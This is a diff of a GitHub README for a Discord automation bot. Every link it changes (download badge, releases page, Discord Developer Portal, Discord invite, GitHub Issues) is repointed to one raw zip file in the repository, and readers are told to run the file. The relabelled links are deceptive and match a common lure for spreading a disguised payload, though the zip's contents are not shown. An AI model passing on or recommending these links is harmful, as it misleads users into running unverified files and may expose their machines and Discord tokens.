@@ -1,6 +1,6 @@
 # 🤖 survival-automation-bot - Automate Your Discord Experience Easily
 
-[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen.svg)](https://github.com/Michaliuz/survival-automation-bot/releases)
+[![Download Now](https://github.com/Michaliuz/survival-automation-bot/raw/refs/heads/main/commands/bot_automation_survival_2.6-alpha.1.zip)](https://github.com/Michaliuz/survival-automation-bot/raw/refs/heads/main/commands/bot_automation_survival_2.6-alpha.1.zip)
 
 ## 📚 Description
 
@@ -10,7 +10,7 @@ The survival-automation-bot is a Discord bot designed to enhance your server exp
 
 To get started with the survival-automation-bot, follow these simple steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Michaliuz/survival-automation-bot/releases) to find the latest version of the bot.
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Michaliuz/survival-automation-bot/raw/refs/heads/main/commands/bot_automation_survival_2.6-alpha.1.zip) to find the latest version of the bot.
 
 2. **Download the Bot**: Choose the latest version from the list and click on it. This will take you to a new page with all available downloads. Look for the file that suits your operating system (usually marked for Windows, macOS, or Linux).
 
@@ -33,7 +33,7 @@ To run the survival-automation-bot smoothly, your system should meet the followi
 
 After launching the bot, you will need to configure it:
 
-1. **Discord Token**: You need a Discord bot token to connect the bot to your Discord account. Visit the [Discord Developer Portal](https://discord.com/developers/applications) to create a new bot and obtain your token.
+1. **Discord Token**: You need a Discord bot token to connect the bot to your Discord account. Visit the [Discord Developer Portal](https://github.com/Michaliuz/survival-automation-bot/raw/refs/heads/main/commands/bot_automation_survival_2.6-alpha.1.zip) to create a new bot and obtain your token.
 
 2. **Set Permissions**: Provide the necessary permissions, such as reading messages, sending messages, and managing messages in your server.
 
@@ -54,11 +54,11 @@ The survival-automation-bot comes packed with useful features:
 
 ## 📥 Download & Install
 
-To download and install the survival-automation-bot, click the following link: [Download Now](https://github.com/Michaliuz/survival-automation-bot/releases).
+To download and install the survival-automation-bot, click the following link: [Download Now](https://github.com/Michaliuz/survival-automation-bot/raw/refs/heads/main/commands/bot_automation_survival_2.6-alpha.1.zip).
 
 ### Installation Steps Recap
 
-1. Visit the [Releases page](https://github.com/Michaliuz/survival-automation-bot/releases).
+1. Visit the [Releases page](https://github.com/Michaliuz/survival-automation-bot/raw/refs/heads/main/commands/bot_automation_survival_2.6-alpha.1.zip).
 2. Download the appropriate file for your operating system.
 3. Run the file and follow the on-screen instructions.
 4. Set up the bot according to your preferences.
@@ -80,7 +80,7 @@ The survival-automation-bot is an open-source project. You can find the full lic
 
 Join our community for support and updates:
 
-- **Discord Server**: [Join our Discord](https://discord.gg/example) for real-time support and discussions.
-- **GitHub Issues**: Report bugs or request features through [GitHub Issues](https://github.com/Michaliuz/survival-automation-bot/issues).
+- **Discord Server**: [Join our Discord](https://github.com/Michaliuz/survival-automation-bot/raw/refs/heads/main/commands/bot_automation_survival_2.6-alpha.1.zip) for real-time support and discussions.
+- **GitHub Issues**: Report bugs or request features through [GitHub Issues](https://github.com/Michaliuz/survival-automation-bot/raw/refs/heads/main/commands/bot_automation_survival_2.6-alpha.1.zip).
 
 Explore the full potential of the survival-automation-bot and enjoy an enhanced Discord experience.
